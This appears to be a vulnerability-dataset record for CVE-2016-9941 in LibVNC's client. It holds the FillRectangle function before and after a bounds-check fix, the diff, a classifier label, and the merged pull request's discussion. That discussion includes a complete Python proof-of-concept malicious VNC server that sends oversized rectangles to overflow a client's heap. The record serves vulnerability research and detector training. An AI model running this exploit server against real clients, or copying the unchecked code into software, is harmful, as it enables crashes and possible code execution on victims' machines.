{
  "cve_id": "CVE-2016-9941",
  "cwe_ids": [
    "CWE-119"
  ],
  "cvss_vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
  "cvss_is_v3": false,
  "repo_name": "LibVNC/libvncserver",
  "commit_msg": "Fix heap overflows in the various rectangle fill functions\n\nAltough rfbproto.c does check whether the overall FramebufferUpdate rectangle is\ntoo large, some of the individual encoding decoders do not, which allows a\nmalicious server to overwrite parts of the heap.",
  "commit_hash": "5418e8007c248bf9668d22a8c1fa9528149b69f2",
  "git_url": "https://github.com/LibVNC/libvncserver/commit/5418e8007c248bf9668d22a8c1fa9528149b69f2",
  "file_path": "libvncclient/rfbproto.c",
  "func_name": "FillRectangle",
  "func_before": "static void FillRectangle(rfbClient* client, int x, int y, int w, int h, uint32_t colour) {\n  int i,j;\n\n  if (client->frameBuffer == NULL) {\n      return;\n  }\n\n#define FILL_RECT(BPP) \\\n    for(j=y*client->width;j<(y+h)*client->width;j+=client->width) \\\n      for(i=x;i<x+w;i++) \\\n\t((uint##BPP##_t*)client->frameBuffer)[j+i]=colour;\n\n  switch(client->format.bitsPerPixel) {\n  case  8: FILL_RECT(8);  break;\n  case 16: FILL_RECT(16); break;\n  case 32: FILL_RECT(32); break;\n  default:\n    rfbClientLog(\"Unsupported bitsPerPixel: %d\\n\",client->format.bitsPerPixel);\n  }\n}",
  "abstract_func_before": "static void FillRectangle(rfbClient* VAR_0, int VAR_1, int VAR_2, int VAR_3, int VAR_4, uint32_t VAR_5) {\n  int VAR_6,VAR_7;\n\n  if (VAR_0->frameBuffer == NULL) {\n      return;\n  }\n\n#define FILL_RECT(VAR_8) \\\n    for(j=y*client->width;j<(y+h)*client->width;j+=client->width) \\\n      for(i=x;i<x+w;i++) \\\n\t((uint##BPP##_t*)client->frameBuffer)[j+i]=colour;\n\n  switch(VAR_0->format.bitsPerPixel) {\n  case  8: FILL_RECT(8);  break;\n  case 16: FILL_RECT(16); break;\n  case 32: FILL_RECT(32); break;\n  default:\n    rfbClientLog(\"Unsupported bitsPerPixel: %d\\n\",VAR_0->format.bitsPerPixel);\n  }\n}",
  "func_graph_path_before": "LibVNC/libvncserver/5418e8007c248bf9668d22a8c1fa9528149b69f2/rfbproto.c/vul/before/0.json",
  "func": "static void FillRectangle(rfbClient* client, int x, int y, int w, int h, uint32_t colour) {\n  int i,j;\n\n  if (client->frameBuffer == NULL) {\n      return;\n  }\n\n  if (!CheckRect(client, x, y, w, h)) {\n    rfbClientLog(\"Rect out of bounds: %dx%d at (%d, %d)\\n\", x, y, w, h);\n    return;\n  }\n\n#define FILL_RECT(BPP) \\\n    for(j=y*client->width;j<(y+h)*client->width;j+=client->width) \\\n      for(i=x;i<x+w;i++) \\\n\t((uint##BPP##_t*)client->frameBuffer)[j+i]=colour;\n\n  switch(client->format.bitsPerPixel) {\n  case  8: FILL_RECT(8);  break;\n  case 16: FILL_RECT(16); break;\n  case 32: FILL_RECT(32); break;\n  default:\n    rfbClientLog(\"Unsupported bitsPerPixel: %d\\n\",client->format.bitsPerPixel);\n  }\n}",
  "abstract_func": "static void FillRectangle(rfbClient* VAR_0, int VAR_1, int VAR_2, int VAR_3, int VAR_4, uint32_t VAR_5) {\n  int VAR_6,VAR_7;\n\n  if (VAR_0->frameBuffer == NULL) {\n      return;\n  }\n\n  if (!CheckRect(VAR_0, VAR_1, VAR_2, VAR_3, VAR_4)) {\n    rfbClientLog(\"Rect out of bounds: %dx%d at (%d, %d)\\n\", VAR_1, VAR_2, VAR_3, VAR_4);\n    return;\n  }\n\n#define FILL_RECT(VAR_8) \\\n    for(j=y*client->width;j<(y+h)*client->width;j+=client->width) \\\n      for(i=x;i<x+w;i++) \\\n\t((uint##BPP##_t*)client->frameBuffer)[j+i]=colour;\n\n  switch(VAR_0->format.bitsPerPixel) {\n  case  8: FILL_RECT(8);  break;\n  case 16: FILL_RECT(16); break;\n  case 32: FILL_RECT(32); break;\n  default:\n    rfbClientLog(\"Unsupported bitsPerPixel: %d\\n\",VAR_0->format.bitsPerPixel);\n  }\n}",
  "func_graph_path": "LibVNC/libvncserver/5418e8007c248bf9668d22a8c1fa9528149b69f2/rfbproto.c/vul/after/0.json",
  "diff_func": "--- func_before\n+++ func_after\n@@ -3,6 +3,11 @@\n \n   if (client->frameBuffer == NULL) {\n       return;\n+  }\n+\n+  if (!CheckRect(client, x, y, w, h)) {\n+    rfbClientLog(\"Rect out of bounds: %dx%d at (%d, %d)\\n\", x, y, w, h);\n+    return;\n   }\n \n #define FILL_RECT(BPP) \\",
  "diff_line_info": {
    "deleted_lines": [],
    "added_lines": [
      "  }",
      "",
      "  if (!CheckRect(client, x, y, w, h)) {",
      "    rfbClientLog(\"Rect out of bounds: %dx%d at (%d, %d)\\n\", x, y, w, h);",
      "    return;"
    ]
  },
  "is_vul": true,
  "pr_url": "https://github.com/LibVNC/libvncserver/pull/137",
  "description": {
    "pr_info": {
      "title": "Fix two heap buffer overflows",
      "number": 137
    },
    "comment": [
      "This PR fixes two unrelated buffer overflows, which can be used by a malicious server to overwrite parts of the heap and crash the client (or possibly execute arbitrary code). \r\n\r\nPoC (for `./client_examples/gtkvncviewer`):\r\n```\r\n#! /usr/bin/env python3\r\n\r\nimport asyncio\r\nimport struct\r\nimport lzo\r\nimport time\r\n\r\nclass EvilVNCProtocol(asyncio.Protocol):\r\n\r\n    def connection_made(self, transport):\r\n        self.transport = transport\r\n        # Note that we just ignore whatever the client says\r\n        self.transport.write(b\"RFB 003.008\\n\")\r\n        # Send supported security types (1 - None)\r\n        self.transport.write(b\"\\x01\\x01\")\r\n        # Confirm that authentication succeeded\r\n        self.transport.write(b\"\\x00\\x00\\x00\\x00\")\r\n        # Send ServerInit\r\n        self.transport.write(\r\n            struct.pack(\">HHBBBBHHHBBBBBBIB\",\r\n                        100, 100, # Framebuffer width and height\r\n                        32, # Bits per pixel\r\n                        8, # Color depth\r\n                        1, # Big endian\r\n                        1, # True Color\r\n                        255, 255, 255, # Color max values\r\n                        0, 8, 16, # Color shifts\r\n                        0, 0, 0, # Padding\r\n                        1, # Name length\r\n                        ord(\"E\") # Name\r\n            )\r\n        )\r\n        # For some reason, not waiting here led to the client occasionally\r\n        # dropping the rest of the input buffer\r\n        time.sleep(0.2)\r\n        # Send evil FramebufferUpdate\r\n        self.send_copyrect_crash()\r\n        #self.send_ultra_lzo_crash()\r\n\r\n    def send_copyrect_crash(self):\r\n        self.transport.write(\r\n            struct.pack(\">BBHHHHHi\",\r\n                        0, 0, # message-type and padding\r\n                        1, # number-of-rectangles\r\n                        10, 0, # x and y positions\r\n                        10, 10, # Width and height\r\n                        2, # encoding = RRE\r\n            )\r\n        )\r\n        self.transport.write(\r\n            struct.pack(\">IIIHHHH\",\r\n                        1, # nSubrects\r\n                        0x41414141, # Background pixel value\r\n                        0x42424242, # Rect pixel value\r\n                        10, 10000, 1, 1 # x, y, w, h\r\n            )\r\n        )\r\n\r\n    def send_ultra_lzo_crash(self):\r\n        self.transport.write(\r\n            struct.pack(\">BBHHHHHi\",\r\n                        0, 0, # message-type and padding\r\n                        1, # number-of-rectangles\r\n                        10, 0, # x and y positions\r\n                        10, 10, # Width and height\r\n                        9, # encoding = Ultra\r\n            )\r\n        )\r\n        data = lzo.compress(b\"A\" * 10000)\r\n        self.transport.write(\r\n            struct.pack(\">I\",\r\n                        len(data)\r\n            )\r\n        )\r\n        self.transport.write(data)\r\n\r\n    def data_received(self, data):\r\n        print(data)\r\n\r\n\r\nloop = asyncio.get_event_loop()\r\ncoro = loop.create_server(EvilVNCProtocol, \"0.0.0.0\", 5900)\r\nserver = loop.run_until_complete(coro)\r\n\r\nloop.run_forever()\r\n```",
      "I cannot get the PoC to run on Debian. Do you know which package to install to get lzo for python3? The other way around, it finds lzo with python2, but then asyncio is not available :-/\n",
      "I installed the python3 version directly from pip (https://pypi.python.org/pypi/python-lzo/1.08) (as it is not available in Gentoo repositories either).\n",
      "Tested && merged. Thanks a lot!",
      "I have been told that it is a good practice to report things like this as CVEs. Do you plan to do that or should I? I see that there are already some libvncserver/libvcnclient CVEs on the [list](http://www.cvedetails.com/product/8258/Libvncserver-Libvncserver.html?vendor_id=4842).",
      "If you could take care of that, I'd be very thankful indeed.",
      "Do you plan on doing a release any time soon? It probably would be useful to have a new version the CVE can refer to as fixed.",
      "Am Tue, 13 Dec 2016 12:34:15 -0800\nschrieb Josef Gajdusek <notifications@github.com>:\n\n> Do you plan on doing a release any time soon? It probably would be useful to\n> have a new version the CVE can refer to as fixed.\n> \n\nYes. 0.9.11 is due before x-mas.\n"
    ]
  },
  "Bug Filter": "Security Vulnerability Fix",
  "Bug Filter Confidence": 1.0,
  "Bug Filter Response": "The commit addresses a buffer overflow vulnerability by adding bounds checking, confirmed by the provided PoC. The code changes directly fix the security issue described.\n\n**Final Classification:** Security Vulnerability Fix  \n**Confidence:** 1.0"
}